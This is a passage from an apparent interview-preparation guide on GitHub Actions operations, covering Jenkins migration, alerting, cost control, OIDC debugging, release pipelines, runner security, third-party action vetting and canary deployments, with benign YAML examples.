The critical correctness pitfall is the **dependency-edge problem**: if you only filter on `services/api/**` and forget that `api` imports `libs/shared`, a change to the shared lib won't trigger `api`'s tests and you ship a break. That's exactly why graph-aware tools win at scale — they derive the affected set from real imports, not hand-maintained globs that drift. The second pitfall is **required checks**: if `api` is a required check but gets skipped, the PR hangs unless you add a status-reporting shim that reports success for skipped services.

The trade-off is maintenance vs accuracy: path filters are zero-dependency but require disciplined hand-maintenance of the dependency globs and silently rot; a build tool is accurate and self-maintaining but adds a tool, a cache, and a learning curve. For a small monorepo I start with path filters; past a handful of interdependent packages I move to Nx/Turbo/Bazel affected-detection with remote caching, because the cost of a missed dependency edge (a shipped break) outweighs the tooling cost.

#### Q61. [Practical] You're migrating 50 Jenkins pipelines to GitHub Actions. How do you plan and de-risk it?

I'd treat it as a migration *program*, not a big-bang rewrite, because Jenkins pipelines accumulate years of implicit behavior (shared libraries, plugin side effects, agent assumptions) that a literal translation will miss. The plan: (1) **inventory and categorize** the 50 pipelines by pattern — most fall into a few archetypes (build-test-publish, deploy, scheduled job), and you migrate by archetype, not one-by-one; (2) build a small set of **org-owned reusable workflows + composite actions** that encode the common archetypes once, so the 50 pipelines become thin callers rather than 50 bespoke YAMLs; (3) **run in parallel** — keep Jenkins authoritative while Actions runs alongside in "report-only" mode, diff the results, and only cut over a pipeline once its Actions version matches Jenkins output for a sustained period.

The de-risking levers are the heart of a senior answer. **Strangler-fig migration**: cut over low-risk pipelines (a docs build, a lint job) first to build confidence and shake out org-level config (runners, secrets, OIDC), then the riskier deploys last. **Map the hard parts explicitly**: Jenkins shared libraries → composite/reusable workflows; Jenkins credentials store → GitHub secrets/OIDC (and this is the moment to *kill* long-lived cloud keys and adopt OIDC rather than porting the old keys); Jenkins agents/labels → hosted runners or self-hosted via ARC; `Jenkinsfile` `stage` parallelism → matrix/parallel jobs; post-build actions → `if: always()`/`failure()` steps.

```
Jenkins concept            GitHub Actions equivalent
─────────────────────      ─────────────────────────────────
shared library (vars/)     reusable workflow / composite action
credentials() binding      secrets:  +  OIDC (drop static keys here)
agent { label 'gpu' }      runs-on: [self-hosted, gpu]  / ARC
parallel { ... }           strategy.matrix / independent jobs
post { failure { ... } }   step with  if: failure()
input (manual gate)        environment + required reviewers
```

The biggest de-risking principle is **don't translate, re-platform**: a 1:1 port carries forward Jenkins anti-patterns (mutable agents holding state, static credentials, snowflake plugins). Migration is the rare chance to adopt least-privilege tokens, OIDC, SHA-pinned actions, and ephemeral runners. I'd also define **success metrics up front** (DORA: lead time, deploy frequency, change-fail rate) and measure before/after to prove the migration's value, and keep a documented rollback (Jenkins stays warm) until the Actions pipeline has earned trust over real release cycles. The trap to avoid is cutting over deploys before CI is proven — start with the leaves of the dependency tree, end with production deploys.

#### Q62. [Practical] How do you get alerted when a workflow fails, and what makes a good vs noisy notification strategy?

The built-in baseline is GitHub's own failure emails (to the actor) and the Actions UI, but those don't scale to a team — they go to the wrong person (the pusher, not the on-call) and get ignored. A real strategy routes failures to where the team already works: a `if: failure()` step that posts to Slack/Teams/PagerDuty with the *actionable context* — repo, branch, the failing job, a direct link to the logs, and who triggered it. The key design choice is **what fails loudly vs quietly**: a failed `main`/release pipeline is an incident (page someone); a failed feature-branch CI is just feedback to the author (a quiet PR check, no alert).

```yaml
notify:
  needs: [build, test, deploy]
  if: failure() && github.ref == 'refs/heads/main'   # only alert on main failures
  runs-on: ubuntu-latest
  steps:
    - uses: slackapi/slack-github-action@v2
      with:
        webhook: ${{ secrets.SLACK_WEBHOOK }}
        webhook-type: incoming-webhook
        payload: |
          { "text": ":red_circle: *${{ github.workflow }}* failed on main\n
            <${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View run> · by ${{ github.actor }}" }
```

The difference between a good and a noisy strategy is **signal-to-noise discipline**. Noisy strategies alert on *every* failure including flaky feature-branch runs, fire one alert per failed job (so one broken pipeline produces 8 pings), and contain no context (just "build failed" with no link). Good strategies: alert only on branches/environments that matter (main, release, production deploys), aggregate to **one notification per run** (a single summary job with `needs:` on all the others rather than per-job alerts), include a deep link and the likely owner (CODEOWNERS), and *de-duplicate* repeated failures so a persistently-broken main doesn't spam every 5 minutes.

The operational maturity layer is treating notification health as a metric: track the alert volume and the **false-positive rate** (alerts that resolved themselves on retry indicate flakiness to fix, not louder alerting). The anti-pattern is alert fatigue — when everything pages, nothing pages, and people mute the channel. The senior framing is that notifications are a routing-and-relevance problem: the right person, with enough context to act, only when it actually matters.

### 🟠 Advanced — extended

#### Q63. [Practical] Your GitHub Actions bill tripled this quarter. How do you find the cost drivers and bring it down?

Cost in Actions is **runner-minutes × multiplier**, so the investigation is "where are minutes going, and at what multiplier?" The multipliers are the first ambush: Linux is 1×, **Windows is 2×, macOS is 10×**, and larger runners scale up further. So a macOS leg in a matrix that runs on every PR can dominate the bill out of proportion to its frequency. I'd pull the org's **usage report** (Settings → Billing → Actions usage, or the API/`gh`), break it down by repository and workflow, and rank by *billed minutes* not run count — a few heavy workflows usually account for most of the spend.

```
cost = Σ (job_minutes × os_multiplier × runner_size_factor)

multipliers:  Linux 1×   Windows 2×   macOS 10×
typical drivers:
  - macOS in a per-PR matrix (10×, runs constantly)
  - no dependency caching → full installs every run
  - cancel-in-progress: false on CI → stale runs finish & bill
  - matrix over-fan-out (untrimmed OS×version product)
  - scheduled jobs running far more often than needed
```

The reduction levers, ordered by typical impact: (1) **trim macOS/Windows usage** — run them only on `main`/release or nightly, not every PR draft, since 10×/2× multipliers make them the dominant cost; (2) **enable `cancel-in-progress: true`** on CI so a force-push doesn't leave three stale builds running to completion and billing; (3) **cache dependencies** so you stop paying for repeated cold installs; (4) **trim the matrix** to the combinations that actually catch bugs (drop redundant minor versions); (5) **add path filters** so docs/config-only changes don't trigger heavy builds; (6) consider **self-hosted/ARC** for steady high-volume Linux load where your own compute is cheaper than metered minutes — but only past the break-even point, since you take on ops burden.

The governance angle separates senior from junior: I'd set up **spending limits and budget alerts** so a runaway loop (a misconfigured `push` that re-triggers itself, a cron set to `* * * * *`) can't silently rack up thousands of dollars, and I'd attribute cost back to teams so the incentive to optimize lands on the owners. The classic root cause of a sudden tripling is often a *single* change — someone added a macOS leg, removed caching, or a recursive trigger loop — so I'd diff workflow changes against the cost inflection date. The deliverable is "here are the three workflows driving 80% of the increase, here's the multiplier math, here are the fixes ranked by savings."

#### Q64. [Practical] A workflow fails only intermittently with a Postgres "connection refused" at the first query. Diagnose and fix.

This is the textbook **service-container race**: the job's first query runs *before* the Postgres sidecar has finished starting, so it sometimes connects (slow CI host gives PG time) and sometimes gets "connection refused" (fast host beats PG's startup). The intermittency is the tell — a deterministic config error would fail every time; a timing race fails proportionally to how fast the runner is. The root cause is that, without a health check, the runner considers the service "started" as soon as the container *launches*, not when Postgres is actually *accepting connections*.

The correct fix is a **health check** on the service so the runner waits until `pg_isready` passes before running steps, plus an application-side wait as defense-in-depth. The health check is the proper mechanism; the app-side retry covers the gap between "accepting connections" and "fully ready for your schema."

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      db:
        image: postgres:16
        env: { POSTGRES_PASSWORD: pw }
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10        # runner waits until healthy before steps run
    steps:
      - uses: actions/checkout@v4
      - run: |
          # belt-and-suspenders: wait for the port before migrating
          until pg_isready -h localhost -p 5432; do sleep 1; done
          ./migrate.sh && npm test
```

The second, easily-missed dimension is the **hostname-vs-localhost flip** depending on where the steps run. If the job runs **directly on the host** (no `container:`), reach Postgres at `localhost:5432` (the published port). If the job runs **inside a container** (`container: node:20`), the service is reachable by its **label as hostname** (`db:5432`) on the shared Docker network, and `localhost` will *not* work. A "connection refused" that's actually a wrong-host bug looks identical to the race at first glance, so I confirm which mode the job is in.

The systematic method generalizes beyond Postgres: any sidecar dependency (Redis, Kafka, a mock server) needs a health check, and any "intermittent connection refused at startup" is a readiness race until proven otherwise. The senior insight is distinguishing the two failure shapes — a *race* (fix with health checks + waits) versus a *wrong-address* bug (fix the host/localhost choice) — because they present identically but have different fixes.

#### Q65. [Practical] How do you debug a workflow interactively when print-debugging isn't enough?

When `echo` logging can't reproduce the problem (an environment-specific path issue, a flaky tool, a permissions puzzle), I escalate through three levels. First, **debug logging**: re-run with `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true` (as repo secrets/variables, or via "Re-run with debug logging") to surface the runner's internal decisions — cache hit/miss, expression evaluation, action download details — that normal logs hide. Second, an **interactive SSH/tmate session**: an action like `mxschmitt/action-tmate` pauses the job and opens an SSH endpoint so I can shell into the *exact* runner mid-run, inspect the filesystem, env, and re-run the failing command by hand. Third, for the truly stubborn, **reproduce locally** with `act` or by replicating the runner image in a container.

```yaml
- name: Interactive debug (gated, never on every run)
  if: ${{ failure() && github.actor == 'me' }}   # only for me, only on failure
  uses: mxschmitt/action-tmate@v3
  with:
    limit-access-to-actor: true     # only the triggering user can connect
    timeout-minutes: 30             # auto-close so it can't hang forever
```

```
debug ladder
  1. ACTIONS_STEP_DEBUG / RUNNER_DEBUG   → see runner internals, cache, expr eval
  2. tmate SSH into the live runner      → inspect FS/env, run cmds by hand
  3. act / matching container locally     → reproduce off-platform, fast iterate
```

The operational guardrails matter because an interactive debug session is a **security and cost hazard** if misused. An open SSH session on a runner with secrets in its environment is an exfiltration surface, so I always gate it: `limit-access-to-actor: true`, a `timeout-minutes` so it can't hold a runner open for hours, and an `if:` condition so it never triggers on normal runs (only on failure, and ideally only for my own actor). I never leave a tmate step committed to `main` — it's a temporary diagnostic, removed once the bug is found.

The senior framing is matching the tool to the opacity of the bug: debug logging for "I can't see what the runner decided," tmate for "I need to poke the live environment," local reproduction for "I need to iterate fast without burning runner minutes per attempt." And the discipline point — interactive debugging on a runner that holds production secrets is genuinely dangerous, so it's tightly scoped, time-boxed, and never a permanent fixture.

#### Q66. [Practical] An OIDC-based cloud deploy that worked yesterday now fails with "Not authorized to perform sts:AssumeRoleWithWebIdentity." How do you diagnose it?

OIDC auth failures are almost always a **claim-matching mismatch** between the JWT GitHub mints and the cloud's trust policy, so the diagnosis is "what does the actual `sub` claim contain, and what does the trust policy expect?" The reason it "worked yesterday" is usually that *something about the run context changed the `sub`*: the deploy moved from `main` to a tag (`sub` flips from `repo:org/app:ref:refs/heads/main` to `...:ref:refs/tags/v1`), or got wrapped in an environment (`...:environment:production`), or someone tightened the trust policy. The `sub` format **varies by trigger context**, and a trust policy pinned to one format silently rejects the others.

```
checklist for "Not authorized ... AssumeRoleWithWebIdentity"
1. permissions: id-token: write present?   (no → no JWT requested at all)
2. what is the ACTUAL sub?  branch/tag/PR/environment change the format:
     branch:      repo:org/app:ref:refs/heads/main
     tag:         repo:org/app:ref:refs/tags/v1.2.0
     environment: repo:org/app:environment:production
     pull req:    repo:org/app:pull_request
3. trust policy Condition matches that sub?  (StringEquals too strict? wildcard?)
4. aud claim == provider expects (AWS: sts.amazonaws.com)?
5. IAM OIDC provider thumbprint / issuer URL still valid?
6. role MaxSessionDuration / requested duration mismatch?
```

The fast diagnostic is to **log the claims** (never the token) — emit the decoded `sub`, `aud`, `ref`, and `environment` to the log, then compare byte-for-byte against the trust policy's condition. Nine times out of ten the mismatch is obvious: the policy says `StringEquals sub repo:org/app:ref:refs/heads/main` but the run is a tag deploy, so `sub` is `...refs/tags/v1` and the exact-match fails. The other common cause is a **missing `permissions: id-token: write`** — if a refactor dropped it (e.g. a job-level `permissions` block that *replaces* rather than merges, omitting `id-token`), no JWT is requested and STS rejects the empty/absent token.

The fix depends on the cause: broaden the trust condition to a `StringLike` that covers the legitimate `sub` shapes you deploy from (while staying as narrow as possible — never `repo:org/*:*`), or pin the workflow to the matching context. I'd also check that someone didn't rotate the IAM OIDC provider or change the issuer thumbprint. The senior discipline is to keep trust policies **claim-pinned but context-aware** — and to recognize that "worked yesterday" OIDC breaks correlate with a *context change* (branch→tag, added environment) far more often than an infra change. The anti-pattern fix to refuse: "just add a static access key so it stops failing" — that re-introduces the standing credential OIDC exists to eliminate.

#### Q67. [Practical] How do you safely roll out a change to a widely-used org reusable workflow without breaking 200 consuming repos?

A reusable workflow consumed by 200 repos is effectively a published API, and you treat changes to it with the same care as a breaking library release. The core mechanism is **versioning by ref**: consumers pin `uses: org/ci/.github/workflows/deploy.yml@<sha-or-tag>`, so a change to the source only affects a repo when *it* bumps its ref. This is why you must *never* tell consumers to pin `@main` — a push to main would instantly change behavior for all 200 repos with no rollout control. Pin to immutable SHAs or a versioned tag, and you control blast radius by who upgrades when.

```
versioning strategy for a shared reusable workflow
  consumers pin:  uses: org/ci/.github/workflows/deploy.yml@v3   (or a SHA)
  you maintain:   v1, v2, v3 tags;  v3 = floating major for opt-in patches
  breaking change → publish v4, do NOT move v3
  additive change → backport to v3 (consumers get it on next run)

rollout:  canary repos (5) on @v4 → bake → docs + migration guide → broad bump (Dependabot PRs)
```

The safe rollout is staged. (1) Make the change **backward-compatible if at all possible** — add new optional `inputs` with sensible defaults rather than changing existing input semantics, so existing callers keep working untouched. (2) If it's genuinely breaking (renamed input, changed required secret), cut a **new major version** (`@v4`) and leave `@v3` running unchanged — never mutate a tag people depend on (that's the `tj-actions` supply-chain lesson and a stability lesson at once). (3) **Canary**: a handful of friendly repos bump to `@v4` first, bake for a release cycle, and you watch for breakage. (4) Publish a **migration guide** and use Dependabot to open bump PRs across consumers so each team upgrades on a reviewable schedule.

The governance and observability layer: the reusable workflow lives in a branch-protected repo with CODEOWNERS (the platform team), has its *own* CI that tests it against representative caller scenarios before release, and emits enough logging/version output that you can see which version each run used (for debugging "why did repo X break?"). The trade-off to articulate is centralization power vs bottleneck risk — a shared workflow gives one-place control but a bad release breaks everyone, so the discipline (semver, immutable tags, canary, additive-by-default) is exactly what prevents the centralized convenience from becoming a centralized outage. The anti-pattern is treating the shared workflow as "just internal YAML" and pushing changes straight to a tag everyone floats on.

#### Q68. [Practical] Walk through building an automated release pipeline: version bump, changelog, tag, GitHub Release, and artifact publish.

A good release pipeline removes humans from the *mechanical* parts (versioning, changelog, tagging, publishing) while keeping them in the *decision* part (what ships). The two dominant approaches: **conventional-commits automation** (semantic-release / release-please), where the version and changelog are *derived from commit messages* (`feat:` → minor, `fix:` → patch, `BREAKING CHANGE:` → major), so the release is fully determined by the merged history; or **tag-triggered** releases, where a human pushes a `v*` tag and the pipeline builds and publishes that exact ref. I prefer commit-driven for libraries (deterministic, no manual version bump) and tag-driven for products where a human decides the release moment.

```yaml
name: Release
on:
  push:
    tags: ['v*']               # tag-triggered: human pushes v1.4.0
permissions:
  contents: write              # to create the GitHub Release + upload assets
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }     # full history for changelog generation
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci && npm run build && npm test
      - name: Generate changelog from commits
        run: npx conventional-changelog -p angular -r 2 > RELEASE_NOTES.md
      - name: Create GitHub Release with artifacts
        uses: softprops/action-gh-release@v2
        with:
          body_path: RELEASE_NOTES.md
          files: dist/*.tgz            # attach build artifacts to the Release
```

```
commit-driven (semantic-release)        tag-driven (above)
  merge feat:/fix: to main      ──▶       human pushes v1.4.0 tag
  bot computes next version                pipeline builds that exact ref
  bot writes changelog + tag               generates notes from commits since last tag
  bot publishes + GitHub Release           creates Release + uploads assets
  zero manual version decisions            human controls the release moment
```

The correctness essentials experienced engineers get right: `fetch-depth: 0` on checkout (changelog and `git describe`-style versioning need full history — a shallow clone silently produces wrong notes); **build/test before publishing** so a broken artifact can't be released; reference artifacts by **immutable identity** (digest for images, exact version for packages) so the published thing is the tested thing; and least-privilege `contents: write` only on the release job. For npm/PyPI/registry publishing, use **OIDC trusted publishing** where supported (npm and PyPI now support it) instead of long-lived publish tokens.

The trade-offs: commit-driven automation is powerful but only as good as commit hygiene (garbage commit messages → garbage versions/changelog), so it needs a commit-lint gate; tag-driven keeps humans in control but reintroduces manual version-bump toil and the risk of tagging the wrong commit. Either way the senior principles are: derive the version deterministically, never hand-edit the changelog, publish by immutable identity, gate publishing behind passing tests and (for prod) a protected environment, and prefer OIDC publishing over static registry tokens. The anti-pattern is a "release" that's a human running `npm publish` from their laptop — unreproducible, unauditable, and credential-leaking.

### 🔴 Expert — extended

#### Q69. [Practical] Design the operational model for self-hosted runners via ARC at scale: autoscaling, isolation, cost, and security.

At scale, self-hosted runners are a *platform* you operate, and the design must balance four competing objectives: security (no state bleed), cost (don't pay for idle), latency (jobs shouldn't wait for cold starts), and isolation (a low-trust repo can't reach a high-trust runner). The foundation is **Actions Runner Controller (ARC)** on Kubernetes running **ephemeral, single-use** runners: each job gets a fresh pod that is destroyed after one job. Ephemerality is non-negotiable for security — a reused runner leaks the previous job's filesystem, installed packages, and potentially credentials to the next, and on a public repo that's a direct path to secret theft.

```
                GitHub Actions service
                       │ pending jobs (webhook / poll)
                       ▼
        ┌──────────  ARC controller  ──────────┐
        │ watches pending → scales RunnerSets    │
        ▼                                        ▼
  runner-pool-default (low trust)        runner-pool-prod (high trust)
   ephemeral pods, repo-scoped            ephemeral pods, restricted repos
   warm min replicas: 3                    warm min: 1, isolated node pool
   scale 0..50 on demand                   network policy: prod VPC only
```

**Autoscaling and latency**: ARC scales runner pods up on pending jobs and down to (near) zero when idle, so you pay for compute roughly proportional to load. The tension is **cold start** — pod schedule + image pull + runner registration adds seconds to minutes. I mitigate with a **warm minimum replica count** for latency-sensitive lanes (trading idle cost for responsiveness), **pre-pulled/cached runner images** on nodes, and node over-provisioning so a pod doesn't wait on a node to scale. For bursty-but-tolerant batch work, scale-to-zero is fine; for the interactive PR lane, keep a warm pool.

**Isolation and security**: I partition runners into **runner groups / RunnerSets by trust tier**, each scoped (via group repo-access policy and Kubernetes namespaces/network policies) so a low-trust repo physically cannot schedule onto the prod runner pool or reach the prod VPC. Sensitive lanes run on isolated node pools with restricted egress. Runners pull secrets via OIDC/short-lived tokens, never bake static credentials into images, and the ephemeral lifecycle guarantees no secret survives a job. **Cost**: self-hosted shifts you from metered minutes to your own cloud bill — worth it past the break-even volume for Linux, but you now own patching, scaling, image hygiene, and on-call for the runner platform. The expert synthesis is that runner operations is a scheduling problem with four axes (security, cost, latency, isolation) that trade against each other — ephemeral+isolated for security, warm pools for latency, scale-to-zero for cost — and there's no single setting that optimizes all four, so you tier the pools by workload.

#### Q70. [Behavioral] Tell me about a production incident caused by your CI/CD pipeline and what you changed afterward.

I'll use STAR. **Situation**: a routine merge to `main` triggered our deploy pipeline, which pushed a broken build to production during business hours and took down a customer-facing service for about 20 minutes. **Task**: stop the bleeding, restore service, and then make sure the *class* of failure couldn't recur. The immediate cause was that the pipeline deployed a mutable image tag (`:latest`) that had been rebuilt with an untested change between the test job and the deploy job — so prod ran bits that were never actually validated.

**Action**: for the incident itself, I rolled back by redeploying the previous known-good image digest (we had it in the deploy history) and confirmed recovery before declaring all-clear. Then, in the blameless postmortem, we fixed the root cause structurally: (1) deploys now reference the **immutable digest** (`@sha256:...`) of the exact image the test job built and signed, not a floating tag, so prod always runs the tested artifact; (2) we added a **protected `production` environment with a required reviewer and a wait-timer canary soak**, so a bad deploy pauses for a human and bakes before full rollout; (3) we added **automated rollback** triggered by post-deploy health checks; and (4) we set `cancel-in-progress: false` on the deploy concurrency group so overlapping deploys couldn't race.

**Result**: zero recurrences of the "deployed-untested-artifact" class in the following year, and our change-failure rate dropped measurably because the canary + health-check rollback caught two later bad deploys *before* they reached full traffic. **Reflection**: the lesson I internalized is that **CI/CD is part of the production blast radius** — a pipeline is not "just automation," it has the keys to prod, and its failure modes (mutable artifacts, missing gates, racing deploys) are production incidents waiting to happen. I now design pipelines with the same rigor as the runtime: immutable artifacts, human gates on prod, automated rollback, and the assumption that *anything* the pipeline can do automatically *will* eventually do at the worst time. The behavioral signal I'd want an interviewer to take away is that I treat the postmortem's job as eliminating the *category* of failure (deploy the tested bits, gate prod, auto-rollback), not just patching the one bug.

#### Q71. [Practical] How do you operate secret rotation and detect/respond to a leaked secret in an Actions-heavy org?

The strongest answer reframes the question: **the best secret rotation is having far fewer secrets to rotate**, which is why an Actions-heavy org should aggressively migrate to **OIDC** (short-lived, auto-expiring cloud credentials with nothing to rotate) and rely on the auto-rotated, job-scoped `GITHUB_TOKEN` for repo operations. Every long-lived secret (a cloud access key, a registry PAT, a third-party API token) is a standing liability, so the operational posture is: inventory all static secrets, eliminate the ones replaceable by OIDC, and put the irreducible remainder on a managed rotation schedule (via a secrets manager — Vault, AWS Secrets Manager — with Actions fetching them at runtime rather than storing them as GitHub secrets at all).

```
secret lifecycle posture
  prefer:  OIDC (no secret) > GITHUB_TOKEN (auto-rotated) > secrets-manager fetch > GH secret
  rotate:  static secrets on a schedule; OIDC = nothing to rotate
  detect:  secret scanning + push protection (org-wide) + scan Actions logs
  respond: revoke first, then investigate; rotate the credential, audit usage
```

**Detection**: enable org-wide **secret scanning with push protection** so a credential committed to code is blocked at push time, and treat any secret appearing in *logs* as compromised (recall masking is exact-match only and trivially defeated by transformation — a base64'd or `jq`-extracted secret prints in clear). I'd also monitor for the leading indicators of the supply-chain leak class: alerts from secret-scanning partners (cloud providers auto-detect leaked keys), and anomalous credential usage in cloud audit logs (a deploy role assumed from an unexpected `sub`).

**Response** to a confirmed leak follows incident discipline: **revoke/disable the credential first** (the leaked key is valid until you kill it — speed matters more than tidiness), then rotate it, then investigate *blast radius* (what could that credential reach, what did it do in the audit window). For an Actions-specific leak — say a third-party action was found exfiltrating secrets (the `tj-actions` scenario) — the response is to revoke *every* secret that action could have seen, audit the cloud logs for misuse, pin all actions to SHAs to prevent recurrence, and check whether the leaked credentials were OIDC (bounded blast radius — they already expired) or static (full rotation needed). The expert takeaway is that rotation is the *fallback*; the real win is structural — minimize standing credentials via OIDC and runtime-fetched short-lived secrets so that a leak is bounded-in-time by design, and pair that with scanning (detect) and a revoke-first runbook (respond). The anti-pattern is a pile of long-lived GitHub secrets with no rotation, no scanning, and no inventory — which turns any single leak into an org-wide rotation fire drill.

#### Q72. [Practical] What's your process for vetting and continuously governing third-party actions across an org?

Third-party actions are *executable code from strangers running with your token and (sometimes) secrets*, so the governance model is the same as any untrusted-dependency supply chain — gate intake, pin versions, and monitor continuously. The intake gate: before an action is allowed org-wide, I evaluate it on concrete signals — is it from a **verified creator** or a reputable maintainer, how actively maintained, what permissions/`id-token` does it request, does it phone home, and (critically) what does the *pinned commit* actually do (read the `dist/` bundle for a JS action, the `Dockerfile`/entrypoint for a container action). An action that requests `id-token: write` or reads broad secrets gets extra scrutiny because its blast radius is large.

```
org-level allowed-actions policy (Settings → Actions → Policies)
  ◯ allow all                  ← never for a security-conscious org
  ◉ allow GitHub + verified + explicit allowlist (all SHA-pinned)
  + require actions referenced by full SHA (block mutable tags)

continuous governance
  Dependabot      → bump pinned SHAs via reviewable PRs (patches without losing immutability)
  CI policy check → reject any @tag/@branch reference at PR time
  periodic audit  → re-review high-blast-radius actions; drop unmaintained ones
```

**Pinning and continuous control** is where most orgs fail. The org **allowed-actions policy** restricts which actions can run at all (GitHub-authored + verified creators + an explicit allowlist), and a CI policy check *rejects* any `uses:` that references a mutable `@tag`/`@branch`, enforcing **SHA pinning** so a hijacked upstream tag (the `tj-actions/changed-files` 2025 incident, where tags were rewritten to exfiltrate secrets) can't silently change the code you run. The tension — SHA pins go stale and miss security patches — is resolved by **Dependabot**, which bumps the pinned SHA via reviewable PRs (keeping the human-readable version in a trailing comment), so you get the patch stream *with* immutability.

The continuous part matters because vetting is not one-time: a once-good action can be abandoned, sold, or compromised. So I'd run a **periodic re-audit** of the allowlist (drop unmaintained actions, re-review the high-privilege ones), prefer **first-party/in-house composite actions** for the common cases (so most repos reference *our* pinned, audited action rather than dozens of third-party ones — shrinking the external attack surface), and consider tools like **OpenSSF Scorecard** to automate pinning/maintenance checks. The expert framing is that third-party actions are a *dependency supply chain* requiring intake review, immutable pinning, automated patching, and continuous re-audit — and that the highest-leverage move is reducing the *count* of distinct third-party actions by consolidating common needs into org-owned composite actions. The anti-pattern is "allow all actions, pin to floating tags" — which is one upstream compromise away from an org-wide breach.

#### Q73. [Practical] How do GitHub Enterprise Server (self-hosted GitHub) pipelines differ operationally from GitHub.com, and what gotchas surface?

GitHub Enterprise Server (GHES) runs Actions on your own infrastructure, and the operational differences come down to *you owning what GitHub.com manages for you*. There are **no GitHub-hosted runners by default** — you must provision and operate all runners yourself (self-hosted or ARC), so capacity planning, scaling, and runner image maintenance are your responsibility from day one. The **Actions Marketplace isn't directly available**; to use third-party actions you sync them into your instance (e.g. via GitHub Connect or by vendoring/mirroring them), which is actually a security upside (you control the supply chain) but an operational cost (you maintain the mirror and its updates).

```
                       GitHub.com              GitHub Enterprise Server (GHES)
Hosted runners         yes                     none by default — you run all runners
Marketplace actions    direct                  sync/mirror via GitHub Connect or vendor
Latest features        immediately             lag by release cycle (you upgrade GHES)
OIDC to public cloud   built-in                needs network egress + reachable issuer URL
Scaling/patching       GitHub's job            yours (storage, runners, the appliance)
Cron / availability    GitHub's SLA            bounded by your appliance uptime
```

The gotchas that bite in practice: (1) **feature lag** — GHES ships features behind GitHub.com by release cycles, so an action or syntax that works on GitHub.com (a new `runs-on` capability, an artifact action version) may not exist on your GHES version yet, breaking copied workflows; you must check the GHES version's supported feature set. (2) **OIDC and external connectivity** — federating to a public cloud requires your GHES instance and runners to have network egress and the cloud to reach GitHub's issuer, which in an air-gapped/restricted network is non-trivial. (3) **Action version availability** — `actions/checkout@v4` etc. must be present in your instance's bundled actions or synced; a workflow pinning a version your mirror doesn't have fails. (4) **Capacity and storage** — artifacts, logs, and caches consume *your* storage, so retention policy and cleanup are operational concerns you own, and runner exhaustion is your incident, not GitHub's.

The senior framing is that GHES trades *control and data-residency* (everything on-prem, you govern the action supply chain, no data leaves your network) for *operational burden and feature lag* (you run the appliance, the runners, and the action mirror, and you're behind on features). Teams choose GHES for compliance/air-gap/residency reasons, and the migration gotcha is assuming GitHub.com workflows port unchanged — they often don't, because of missing hosted runners, unmirrored actions, and version-gated features. The mitigation is treating the GHES Actions environment as its own platform with its own runner fleet, action mirror, upgrade cadence, and capacity plan — not as "GitHub.com but private."

#### Q74. [Practical] Implement a canary/progressive deployment with automatic rollback on health-check failure, driven from Actions.

Progressive delivery means shifting traffic to the new version gradually while *watching health*, and rolling back automatically if metrics degrade — so a bad release affects a small fraction of users for a short time instead of everyone instantly. The honest expert position first: Actions is the **orchestrator/trigger**, not the traffic-shifter — the actual canary mechanics live in your deployment substrate (a service mesh like Istio/Linkerd, a progressive-delivery controller like Argo Rollouts/Flagger, or a load balancer's weighted routing). Actions kicks off the rollout, polls health, and decides promote-vs-rollback; the platform does the weighted routing. Trying to implement true traffic-splitting *inside* a workflow with `kubectl` and sleeps is a fragile anti-pattern.

```yaml
deploy-canary:
  runs-on: ubuntu-latest
  environment: production
  permissions: { id-token: write, contents: read }
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with: { role-to-assume: arn:aws:iam::...:role/gha-prod, aws-region: us-east-1 }
    - name: Deploy canary at 10% traffic
      run: ./rollout.sh set-canary --image $IMAGE --weight 10
    - name: Watch canary health (auto-rollback on breach)
      run: |
        for i in $(seq 1 10); do                     # ~5 min soak
          err=$(./metrics.sh error-rate --window 30s)
          lat=$(./metrics.sh p99-latency --window 30s)
          if (( $(echo "$err > 1.0" | bc) )) || (( $(echo "$lat > 500" | bc) )); then
            echo "::error::canary breached SLO (err=$err% p99=${lat}ms) — rolling back"
            ./rollout.sh abort --image $IMAGE        # shift traffic back to stable
            exit 1
          fi
          sleep 30
        done
    - name: Promote canary to 100%
      run: ./rollout.sh promote --image $IMAGE
```

```
deploy 10% ──▶ soak + watch SLOs ──┬─ healthy ──▶ 25% ──▶ 50% ──▶ 100% (promote)
                                    └─ breach  ──▶ abort: traffic → stable (rollback)
                health gate = error-rate & p99 latency vs SLO, NOT "did it deploy"
```

The design points that make it production-correct: the **health gate must be SLO-based, not "did the deploy command succeed"** — a deploy can succeed and still be serving 500s, so you watch *real user-facing metrics* (error rate, p99 latency, saturation) over a soak window long enough to catch issues but short enough to limit exposure. **Rollback must be the automatic default on breach**, and it must be *fast* (shift traffic back to the known-good version, which is why immutable-digest deploys matter — the stable version is still there to route to). The soak window and thresholds are tuned to your traffic: too short misses slow-burning failures, too long extends the blast window.

The trade-offs and where Actions fits: a dedicated controller (Flagger/Argo Rollouts) does this more robustly than a workflow loop — it integrates with the mesh, handles metric analysis natively, and survives a runner dying mid-soak (a workflow holding a 30-minute poll is brittle and burns a runner). So the senior pattern is **Actions triggers the rollout and the controller runs it**, or Actions polls a controller's status rather than implementing the soak itself. Combine with the protected-environment reviewer gate for the *promotion to start*, OIDC for credentials, and a hard rule that rollback is always reachable. The anti-pattern is a workflow that deploys 100% instantly and calls it "done" the moment `kubectl apply` returns — that's not a deployment strategy, it's a coin flip.

#### Q75. [Practical] How do you tune dependency caching that's "not helping" — high miss rate, stale hits, or cache bloat?

A cache that isn't helping has a *diagnosable* failure mode, and the fix differs sharply by mode, so the first step is to read the cache hit/miss lines (enable debug logging if needed) and classify: **high miss rate** (key changes too often), **stale hits** (key changes too rarely so you serve outdated contents), or **bloat/eviction** (you're caching too much and getting evicted under the ~10 GB repo budget). Each is a *keying* problem at heart, because the cache action's behavior is entirely governed by the `key` and `restore-keys`.

```
symptom            root cause                         fix
high miss rate     key too volatile (timestamp, sha,  key on LOCKFILE hash, not commit sha;
                   per-run value in key)              add restore-keys prefix for warm starts
stale hits         key too stable (no lockfile hash)  include hashFiles(lockfile) in exact key
cache bloat        caching build outputs / node_modules cache the package MANAGER cache
